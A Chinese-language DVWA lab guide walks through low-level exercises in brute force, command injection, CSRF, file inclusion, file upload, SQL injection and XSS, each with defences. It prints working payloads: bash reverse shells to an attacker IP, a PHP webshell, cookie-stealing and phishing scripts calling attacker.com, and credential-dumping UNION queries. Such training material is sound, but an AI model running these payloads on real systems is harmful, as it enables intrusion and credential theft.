# DVWA漏洞练习详细指南

## 概述

DVWA（Damn Vulnerable Web Application）是一个用PHP和MySQL开发的Web应用程序，旨在作为安全入门者学习Web安全的合法靶机环境。通过DVWA，您可以实践和理解最常见的Web漏洞，其难度等级分为low（低）、medium（中）、high（高）、impossible（不可能）四个级别。本指南专注于low级别，帮助您掌握基础漏洞原理和操作技能。

---

## 环境准备

### 使用Docker搭建DVWA

首先，确保您已安装Docker环境。然后执行以下命令启动DVWA：

```bash
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
```

命令执行后，DVWA容器将在后台运行。您可以通过以下方式验证容器状态：

```bash
docker ps | grep dvwa
```

### 访问DVWA

打开浏览器，访问 http://localhost:8080。如果这是首次访问，DVWA会自动跳转到 setup 页面，您需要点击 "Create / Reset Database" 按钮初始化数据库。

初始化完成后，使用以下凭据登录：
- 用户名：`admin`
- 密码：`password`

登录成功后，您将看到DVWA的主界面，顶栏显示功能模块包括：
- Home（首页）
- Vulnerabilities（漏洞选择）
- Instructions（说明文档）
- PHPIDS（PHP入侵检测）
- About（关于）
- Logout（退出）

---

## 漏洞模块详解

DVWA包含以下漏洞模块，我们将逐一进行详细讲解和实操练习：

1. Brute Force（暴力破解）
2. Command Injection（命令注入）
3. CSRF（跨站请求伪造）
4. File Inclusion（文件包含）
5. File Upload（文件上传）
6. Insecure CAPTCHA（不安全的验证码）
7. SQL Injection（SQL注入）
8. SQL Injection (Blind)（盲注SQL注入）
9. Weak Session IDs（弱会话ID）
10. XSS (DOM)（DOM型跨站脚本）
11. XSS (Reflected)（反射型跨站脚本）
12. XSS (Stored)（存储型跨站脚本）
13. CSP Bypass（内容安全策略绕过）
14. JavaScript（JavaScript攻击）

---

## 1. Brute Force（暴力破解）

### 漏洞原理

暴力破解是一种通过尝试大量用户名和密码组合来猜测正确凭据的攻击方式。当Web应用没有有效的登录限制或强密码策略时，攻击者可以使用自动化工具进行暴力破解尝试。

### Low级别实操

#### 步骤1：进入Brute Force模块

点击导航栏的 "Vulnerabilities" → "Brute Force"，进入暴力破解练习页面。

#### 步骤2：分析登录表单

在Brute Force页面中，您将看到一个标准的登录表单，包含：
- 用户名输入框：Username
- 密码输入框：Password
- "Login"（登录）按钮

在low级别下，系统没有登录失败次数限制，也没有账户锁定机制，这使得暴力破解成为可能。

#### 步骤3：使用Burp Suite进行暴力破解

首先，在浏览器中配置代理，将流量转发到Burp Suite（默认127.0.0.1:8080），然后在Brute Force页面提交一个测试登录请求（比如用户名admin，密码任意）。

在Burp Suite的Proxy模块中，找到该登录请求，右键选择 "Send to Intruder"（发送到入侵者）。

##### 配置Intruder

在Intruder模块中，进行以下配置：

**Positions（位置）标签页**：
- 系统会自动标记需要暴力破解的参数（如密码字段）
- 清除所有自动标记，然后手动添加需要破解的参数
- 选择攻击类型为 "Sniper"（狙击手模式）

**Payloads（载荷）标签页**：
- 在Payload Sets中选择要破解的参数（通常是密码字段）
- 在Payload Options中选择密码字典或手动添加密码列表
- 您可以使用常见的弱密码字典，或者手动输入一些常用密码进行测试

**Payload Options示例**（请仅用于合法的安全测试）：
```
password
123456
admin
letmein
12345678
1234
123456789
12345
dragon
master
```

**步骤4**：配置完成后，点击 "Start Attack"（开始攻击）按钮，Burp Suite将开始自动尝试每个密码。

**步骤5**：分析结果
- 攻击完成后，根据响应长度（Length）或响应状态码判断哪个密码成功
- 通常，成功的登录响应长度或状态码会与失败的响应不同
- 在low级别下，使用密码 `password` 即可成功登录

#### 防御方法

- **强密码策略**：要求用户使用复杂密码，包含大小写字母、数字和特殊字符
- **账户锁定机制**：连续失败登录后锁定账户
- **多因素认证**：增加额外的验证步骤
- **登录验证码**：防止自动化工具进行暴力破解
- **限制登录频率**：使用限流技术减缓暴力破解速度

---

## 2. Command Injection（命令注入）

### 漏洞原理

命令注入漏洞发生在Web应用程序将用户输入传递给系统命令执行时。如果应用程序没有对用户输入进行充分的过滤或验证，攻击者可以注入额外的系统命令，在服务器上执行任意操作。

### Low级别实操

#### 步骤1：进入Command Injection模块

点击导航栏的 "Vulnerabilities" → "Command Injection"，进入命令注入练习页面。

#### 步骤2：分析Ping功能

在Command Injection页面中，您将看到一个Ping表单，包含：
- IP地址输入框：Please supply a target IP address
- "Submit"（提交）按钮

该功能旨在让用户输入一个IP地址，然后服务器执行ping命令来测试该IP的连通性。

#### 步骤3：测试基本命令注入

在输入框中输入一个正常的IP地址进行测试：

```
8.8.8.8
```

点击Submit，您将看到ping命令的执行结果。

#### 步骤4：尝试命令注入

由于low级别没有对用户输入进行任何过滤，您可以尝试注入额外的系统命令。在不同操作系统中，命令分隔符有所不同：

**Linux/Unix系统**，使用分号 `;` 或 `&&` 分隔命令：

```
8.8.8.8; whoami
```

或

```
8.8.8.8 && whoami
```

点击Submit，如果服务器是Linux系统，您将在结果中看到当前Web服务器运行的用户（通常是www-data、nobody或apache）。

#### 步骤5：执行更多命令

成功注入后，您可以尝试更多命令来探测系统信息：

**查看系统用户**：
```
8.8.8.8; cat /etc/passwd
```

**查看当前目录**：
```
8.8.8.8; pwd
```

**查看当前用户组**：
```
8.8.8.8; id
```

**读取敏感文件**：
```
8.8.8.8; cat /etc/shadow
```

**反弹Shell**（需要攻击者准备监听端）：
```
8.8.8.8; bash -i >& /dev/tcp/攻击者IP/端口 0>&1
```

#### 防御方法

- **输入验证**：严格验证用户输入，只允许有效的IP地址格式
- **避免使用系统命令**：尽量使用API或库函数代替系统命令
- **参数化命令**：使用安全的命令执行方式，不直接拼接用户输入
- **最小权限原则**：Web服务器运行账户应具有最小必要权限

---

## 3. CSRF（跨站请求伪造）

### 漏洞原理

CSRF攻击利用用户已认证的会话，诱导用户在不知情的情况下向Web应用程序发送恶意请求。如果用户当前已登录到目标网站，攻击者可以诱骗用户访问恶意页面，该页面会自动发送伪造的请求到目标网站，利用用户的会话完成转账、密码修改等操作。

### Low级别实操

#### 步骤1：进入CSRF模块

点击导航栏的 "Vulnerabilities" → "CSRF"，进入CSRF练习页面。

#### 步骤2：分析密码修改表单

在CSRF页面中，您将看到一个密码修改表单，包含：
- 新密码输入框：New password
- 确认新密码输入框：Confirm new password
- "Change"（更改）按钮

#### 步骤3：正常修改密码

首先，使用正常方式修改密码：
- 在新密码框中输入：`newpassword`
- 确认密码框中再次输入：`newpassword`
- 点击Change按钮
- 页面显示 "Password Changed." 表示修改成功

#### 步骤4：构造CSRF攻击

现在，我们将创建一个恶意页面，诱导已登录用户自动提交密码修改请求。

创建一个HTML文件，命名为 `csrf_attack.html`，内容如下：

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Page</title>
</head>
<body>
    <h1>Congratulations! You've won a prize!</h1>
    <p>Click the button below to claim your reward.</p>
    
    <!-- 隐藏的表单，自动提交 -->
    <form id="csrfForm" action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
        <button type="submit" id="attackBtn" style="display:none;">Claim Prize</button>
    </form>
    
    <script>
        // 页面加载完成后自动提交表单
        window.onload = function() {
            document.getElementById('csrfForm').submit();
        }
    </script>
</body>
</html>
```

#### 步骤5：测试CSRF攻击

1. 首先，确保DVWA中的用户已登录（保持登录状态）
2. 在浏览器中打开刚创建的 `csrf_attack.html` 页面
3. 页面加载后，会自动向DVWA的CSRF模块发送密码修改请求
4. 由于浏览器会自动携带当前会话的Cookie，DVWA会认为这是一个合法的密码修改请求
5. 攻击成功后，用户的密码已被修改为 `hacked123`

#### 步骤6：验证攻击结果

返回DVWA页面，使用新密码 `hacked123` 登录，如果登录成功，说明CSRF攻击成功。

#### 防御方法

- **CSRF Token**：在表单中添加随机生成的Token，服务器验证Token的有效性
- **SameSite Cookie**：设置Cookie的SameSite属性，防止跨站请求
- **验证Referer**：检查HTTP请求的Referer头，确保请求来自可信来源
- **重新认证**：对敏感操作要求用户重新输入密码
- **验证码**：使用验证码确保用户意图

---

## 4. File Inclusion（文件包含）

### 漏洞原理

文件包含漏洞发生在Web应用程序使用变量（如`$file`、`$page`）来动态包含文件时，如果没有对用户输入进行充分验证，攻击者可以构造恶意输入来包含服务器上的任意文件，甚至执行远程恶意代码。

文件包含分为本地文件包含（LFI）和远程文件包含（RFI）。

### Low级别实操

#### 步骤1：进入File Inclusion模块

点击导航栏的 "Vulnerabilities" → "File Inclusion"，进入文件包含练习页面。

#### 步骤2：分析URL参数

进入File Inclusion页面后，您会看到页面显示一些可点击的链接，如：
- File1
- File2
- File3

点击其中一个链接，观察浏览器URL的变化。

假设点击 "File1" 后，URL变为：
```
http://localhost:8080/vulnerabilities/fi/?page=include.php
```

这里的 `page` 参数就是要测试的文件包含参数。

#### 步骤3：测试本地文件包含（LFI）

尝试包含服务器上的本地文件：

**读取系统文件（Linux）**：
```
http://localhost:8080/vulnerabilities/fi/?page=/etc/passwd
```

如果存在LFI漏洞，页面将显示 `/etc/passwd` 文件的内容。

**读取配置文件**：
```
http://localhost:8080/vulnerabilities/fi/?page=../../../../../../../etc/passwd
```

使用 `../` 来遍历目录，尝试找到根目录。

**读取Web应用源码**：
```
http://localhost:8080/vulnerabilities/fi/?page=../hackable/uploads/somefile.txt
```

#### 步骤4：测试远程文件包含（RFI）

如果服务器配置允许远程文件包含（PHP的`allow_url_fopen`和`allow_url_include`为On），可以尝试包含远程恶意文件：

```
http://localhost:8080/vulnerabilities/fi/?page=http://attacker.com/malicious.txt
```

如果成功，服务器会从远程服务器获取并执行恶意文件。

#### 步骤5：利用LFI获取敏感信息

在Linux系统中，可以尝试读取以下文件：

**读取日志文件**：
```
http://localhost:8080/vulnerabilities/fi/?page=/var/log/apache2/access.log
```

**读取/proc配置文件**：
```
http://localhost:8080/vulnerabilities/fi/?page=/proc/self/environ
```

**读取PHP session文件**（可能包含敏感信息）：
```
http://localhost:8080/vulnerabilities/fi/?page=/tmp/sess_SESSION_ID
```

#### 防御方法

- **输入验证**：严格验证用户输入，只允许指定的文件
- **白名单方式**：使用白名单而不是黑名单来验证文件名
- **禁用远程文件包含**：在PHP配置中设置 `allow_url_include = Off`
- **安全路径**：确保包含的文件路径在预期范围内

---

## 5. File Upload（文件上传）

### 漏洞原理

文件上传漏洞发生在Web应用程序允许用户上传文件但没有充分验证文件的类型、内容或存储位置时。攻击者可以上传恶意文件（如Webshell），然后通过访问这些文件在服务器上执行任意代码，从而完全控制Web服务器。

### Low级别实操

#### 步骤1：进入File Upload模块

点击导航栏的 "Vulnerabilities" → "File Upload"，进入文件上传练习页面。

#### 步骤2：分析上传功能

在File Upload页面中，您将看到一个文件上传表单，包含：
- 文件选择按钮：选择要上传的文件
- "Upload"（上传）按钮

页面上传功能应该会显示上传结果和文件保存路径。

#### 步骤3：上传正常文件

首先，上传一个正常的图片文件（如`.jpg`或`.png`）进行测试：
- 选择一个图片文件
- 点击Upload按钮
- 观察上传结果，确认文件上传成功

注意上传成功后显示的文件路径，类似：
```
/hackable/uploads/filename.jpg
```

#### 步骤4：上传Webshell

现在，我们将上传一个简单的PHP Webshell。

创建一个PHP文件，命名为 `webshell.php`，内容如下：

```php
<?php
system($_GET['cmd']);
?>
```

这个Webshell允许通过URL参数执行系统命令。

#### 步骤5：上传恶意文件

在File Upload页面：
- 选择刚创建的 `webshell.php` 文件
- 点击Upload按钮
- 如果low级别没有验证文件类型，上传应该成功

上传成功后，记下文件路径，通常为：
```
/hackable/uploads/webshell.php
```

#### 步骤6：访问并使用Webshell

在浏览器中访问Webshell文件：

```
http://localhost:8080/hackable/uploads/webshell.php?cmd=whoami
```

如果成功执行，您将在页面中看到Web服务器运行的用户（如www-data）。

可以尝试更多命令：

```
# 查看目录
http://localhost:8080/hackable/uploads/webshell.php?cmd=ls -la

# 查看系统信息
http://localhost:8080/hackable/uploads/webshell.php?cmd=uname -a

# 查看/etc/passwd文件
http://localhost:8080/hackable/uploads/webshell.php?cmd=cat%20/etc/passwd
```

#### 步骤7：获取交互式Shell

如果条件允许，可以通过Webshell建立反向Shell连接：

在攻击者机器上准备监听：
```bash
nc -lvp 4444
```

然后在Webshell中执行反弹Shell命令：
```
http://localhost:8080/hackable/uploads/webshell.php?cmd=bash -i >& /dev/tcp/攻击者IP/4444 0>&1
```

#### 防御方法

- **文件类型验证**：检查文件的MIME类型和扩展名
- **文件内容验证**：检查文件头部内容，确保是预期的文件类型
- **文件重命名**：上传后重命名文件，避免执行
- **存储位置隔离**：将上传文件存储在Web根目录之外
- **执行权限**：确保上传目录没有执行权限

---

## 6. SQL Injection（SQL注入）

### 漏洞原理

SQL注入攻击发生在Web应用程序将用户输入直接拼接到SQL查询语句中而没有进行充分验证或参数化时。攻击者可以通过构造恶意的SQL语句来操纵数据库查询，获取敏感数据、修改数据或在某些情况下执行操作系统命令。

### Low级别实操

#### 步骤1：进入SQL Injection模块

点击导航栏的 "Vulnerabilities" → "SQL Injection"，进入SQL注入练习页面。

#### 步骤2：分析用户输入

在SQL Injection页面中，您将看到一个用户ID查询表单，包含：
- 用户ID输入框：User ID
- "Submit"（提交）按钮

页面会显示查询结果，比如 "First name: admin, Surname: admin"。

#### 步骤3：测试基本注入

正常查询，用户ID输入 `1`，点击Submit，应该返回用户ID为1的信息。

#### 步骤4：判断是否存在SQL注入

尝试在输入框中输入以下内容来判断SQL注入漏洞：

**基于错误的注入**（单引号测试）：
```
1'
```

如果页面返回错误信息，如 "You have an error in your SQL syntax"，说明存在SQL注入漏洞。

**永真条件测试**：
```
1' OR '1'='1
```

如果返回了所有用户信息，而不是只返回ID为1的用户信息，说明存在SQL注入漏洞。

#### 步骤5：获取数据库信息

**步骤5.1：确定列数**

使用 `ORDER BY` 来确定查询的列数：

```
1' ORDER BY 1#
```
不报错则继续：
```
1' ORDER BY 2#
```
继续直到报错，例如 `ORDER BY 3` 报错，说明查询有2列。

**步骤5.2：获取当前数据库和用户**

使用 `UNION SELECT` 获取数据库信息：

```
1' UNION SELECT version(), user()#
```

这将显示MySQL版本和当前用户。

**步骤5.3：获取数据库名称**

```
1' UNION SELECT database(), user()#
```

这将显示当前数据库名称（通常为 `dvwa`）。

**步骤5.4：获取所有数据库**

```
1' UNION SELECT schema_name, 1 FROM information_schema.schemata#
```

这将列出所有数据库名称。

#### 步骤6：获取表名

假设当前数据库是 `dvwa`，获取其中的表名：

```
1' UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='dvwa'#
```

常见的表名包括 `guestbook`、`users` 等。

#### 步骤7：获取列名

假设 `users` 表是我们感兴趣的表，获取其中的列名：

```
1' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='users'#
```

这将列出 `users` 表的所有列，常见的列包括 `user_id`、`first_name`、`last_name`、`user`、`password`、`avatar` 等。

#### 步骤8：获取用户凭据

现在我们可以获取具体的用户数据了：

```
1' UNION SELECT user, password FROM users#
```

这将显示用户名和密码（通常是MD5哈希后的密码）。

#### 步骤9：破解密码

获取的密码通常是MD5哈希值，可以尝试破解：

- 在线MD5破解网站
- 使用Hashcat等工具进行暴力破解
- DVWA中用户的密码通常是 `password`、`123456`、`abc123` 等简单密码

#### 防御方法

- **使用参数化查询（Prepared Statements）**：将SQL语句和用户输入分离
- **输入验证**：严格验证用户输入的数据类型和格式
- **最小权限原则**：数据库账户只授予必要的权限
- **错误处理**：不要在生产环境中显示详细错误信息
- **转义特殊字符**：对用户输入的特殊字符进行转义

---

## 7. XSS (Reflected)（反射型跨站脚本）

### 漏洞原理

反射型XSS攻击发生在Web应用程序将用户输入作为参数直接返回到页面中，而没有进行适当的输出编码或验证时。攻击者诱骗用户点击包含恶意脚本的链接，当用户点击后，恶意脚本会在用户浏览器中执行，窃取Cookie、会话令牌或其他敏感信息。

### Low级别实操

#### 步骤1：进入XSS (Reflected)模块

点击导航栏的 "Vulnerabilities" → "XSS (Reflected)"，进入反射型XSS练习页面。

#### 步骤2：分析输入点

在XSS (Reflected)页面中，您将看到一个名字查询表单，包含：
- 名字输入框：What is your name?
- "Input"（输入）按钮

页面会显示一个欢迎消息，比如 "Hello " + 您的输入。

#### 步骤3：测试基本XSS

在输入框中输入一个简单的测试字符串：

```
Test
```

点击Input按钮，观察页面显示 "Hello Test"。

#### 步骤4：测试XSS漏洞

尝试输入HTML或JavaScript代码：

**测试1：弹出警告框**
```
<script>alert('XSS')</script>
```

点击Input按钮，如果页面弹出一个警告框（显示"XSS"），说明存在XSS漏洞。

**测试2：窃取Cookie（概念验证）**
```
<script>alert(document.cookie)</script>
```

点击Input按钮，如果页面弹出当前页面的Cookie，说明存在XSS漏洞。

**测试3：外部脚本**
```
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

此代码会将用户Cookie重定向到攻击者的服务器。

#### 步骤5：构造钓鱼攻击

创建一个简单的钓鱼表单：

```
<script>
document.write('<form action="http://attacker.com/phish.php" method="POST">');
document.write('<input type="text" name="username" placeholder="Please login">');
document.write('<input type="password" name="password" placeholder="Password">');
document.write('<input type="submit" value="Login">');
document.write('</form>');
</script>
```

这段代码会在页面上插入一个伪造的登录表单。

#### 防御方法

- **输入验证**：严格验证用户输入的内容和格式
- **输出编码**：在输出用户输入到HTML页面时进行HTML实体编码
- **内容安全策略（CSP）**：配置CSP头部防止外部脚本执行
- **HTTPOnly Cookie**：设置Cookie的HttpOnly属性，防止JavaScript访问
- **使用模板引擎**：现代Web框架通常会自动进行输出编码

---

## 8. XSS (Stored)（存储型跨站脚本）

### 漏洞原理

存储型XSS攻击发生在应用程序将用户输入存储到数据库或其他存储介质中，之后在用户访问相关页面时将这些存储的数据直接显示出来时。不同于反射型XSS，存储型XSS的恶意脚本会被永久保存在目标服务器上，所有访问该页面的用户都会受到攻击。

### Low级别实操

#### 步骤1：进入XSS (Stored)模块

点击导航栏的 "Vulnerabilities" → "XSS (Stored)"，进入存储型XSS练习页面。

#### 步骤2：分析留言板功能

在XSS (Stored)页面中，您将看到一个简单的留言板，包含：
- Name（名字）输入框
- Message（消息）文本框
- "Sign Guestbook"（提交留言）按钮

下方会显示已提交的留言列表。

#### 步骤3：测试存储型XSS

在Name和Message输入框中填写正常内容，点击提交，观察留言成功添加并显示在下方列表中。

#### 步骤4：注入恶意脚本

在Name或Message输入框中输入XSS Payload：

**在Name字段**：
```
<script>alert('Stored XSS in Name')</script>
```

**在Message字段**：
```
<script>alert('Stored XSS in Message')</script>
```

点击 "Sign Guestbook" 按钮提交。

#### 步骤5：验证存储型XSS

提交成功后，每次有用户访问XSS (Stored)页面时，都会触发这个弹窗。这意味着恶意脚本已经被永久存储在服务器上，所有访问该页面的用户都会受到攻击。

#### 步骤6：窃取用户会话

更高级的攻击场景是窃取用户会话信息。在Message中输入：

```php
<script>
var cookies = document.cookie;
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + cookies;
</script>
```

当其他用户访问该页面时，他们的Cookie会被发送到攻击者的服务器。

#### 防御方法

- **输入验证**：严格验证所有用户提交的内容
- **输出编码**：在显示用户输入时进行HTML实体编码
- **内容安全策略（CSP）**：配置CSP防止外部脚本执行
- **HTTPOnly Cookie**：防止JavaScript访问敏感Cookie
- **安全标记**：使用安全标记（如AntiSamy库）清理HTML输入

---

## 9. CSRF（跨站请求伪造）

（注：本节为CSRF漏洞的补充内容，重点讲解攻击链构造）

### 完整攻击链构造

#### 步骤1：创建恶意页面

攻击者首先创建一个托管在攻击服务器上的恶意HTML页面，用于自动提交CSRF请求：

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <form id="attackForm" action="http://target-dvwa/vulnerabilities/csrf/" method="POST">
        <input type="hidden" name="password_new" value="compromised">
        <input type="hidden" name="password_conf" value="compromised">
        <input type="hidden" name="Change" value="Change">
    </form>
    
    <script>
        document.getElementById('attackForm').submit();
    </script>
    
    <p>If you are not redirected, <a href="http://target-dvwa/">click here</a>.</p>
</body>
</html>
```

#### 步骤2：诱骗用户访问

攻击者通过以下方式诱骗已登录用户访问恶意页面：
- 发送钓鱼邮件
- 在用户经常访问的网站嵌入恶意链接
- 利用社交工程技巧

#### 步骤3：攻击执行

当已登录用户访问恶意页面时：
1. 浏览器自动向目标站点发送POST请求
2. 请求携带用户的有效Session Cookie
3. 目标站点验证Session后执行密码修改操作
4. 用户密码被修改为攻击者指定的密码

#### 步骤4：攻击验证

攻击完成后，攻击者可以使用新密码登录用户账户。

---

## 10. 总结与进阶建议

### Low级别核心要点

通过DVWA Low级别的练习，您应该掌握以下核心技能：

| 漏洞类型 | 攻击手法 | 防御要点 |
|----------|----------|----------|
| Brute Force | 使用工具进行密码暴力破解 | 账户锁定、强密码、多因素认证 |
| Command Injection | 通过;或&&注入系统命令 | 输入验证、避免系统命令、参数化 |
| CSRF | 构造恶意页面伪造用户请求 | CSRF Token、SameSite Cookie、验证码 |
| File Inclusion | 读取本地文件或远程文件 | 输入验证、白名单、禁用远程包含 |
| File Upload | 上传Webshell获取服务器权限 | 文件类型验证、存储隔离、权限控制 |
| SQL Injection | 使用UNION或错误提取数据库数据 | 参数化查询、输入验证、最小权限 |
| XSS (Reflected) | 注入脚本到URL参数中 | 输出编码、CSP、HTTPOnly Cookie |
| XSS (Stored) | 注入脚本到数据库永久存储 | 输入验证、输出编码、CSP |

### 进阶学习建议

完成Low级别后，建议按以下步骤进阶：

1. **Medium级别**：了解开发者添加的基本防护措施，学习如何绕过
2. **High级别**：学习更复杂的绕过技巧，理解安全的代码应该怎么写
3. **Impossible级别**：参考最佳实践，理解完整的安全防护方案

### 练习记录模板

建议您使用以下模板记录每个漏洞的练习过程：

```markdown
## 漏洞名称：XXX
**日期**：YYYY-MM-DD
**级别**：Low/Medium/High/Impossible

### 1. 漏洞原理
（用自己的语言描述漏洞产生的原理）

### 2. 攻击过程
（详细记录每一步操作，包括输入的Payload）

### 3. 攻击结果
（记录攻击成功后的效果）

### 4. 防御方法
（总结如何防御此类漏洞）

### 5. 心得体会
（记录学习过程中的思考和发现）
```

---

## 附录

### 常用Burp Suite快捷键

- **Ctrl + I**：将请求发送到Intruder
- **Ctrl + R**：将请求发送到Repeater
- **Ctrl + U**：URL编码选中的内容
- **Ctrl + Shift + U**：URL解码选中的内容
- **空格键**：Intercept开关

### 常用浏览器代理配置

**Firefox代理配置**：
1. 打开设置 → 高级 → 网络 → 连接设置
2. 选择"手动代理配置"
3. HTTP代理：127.0.0.1，端口：8080
4. 勾选"为所有协议使用相同代理"
5. 导入Burp Suite的CA证书到Firefox

### DVWA靶机常见问题

**问题1：Docker无法启动**
解决方案：检查Docker服务是否运行，确保端口8080未被占用

**问题2：无法连接数据库**
解决方案：执行"Create / Reset Database"按钮重置数据库

**问题3：文件上传无反应**
解决方案：检查upload目录权限，确保可写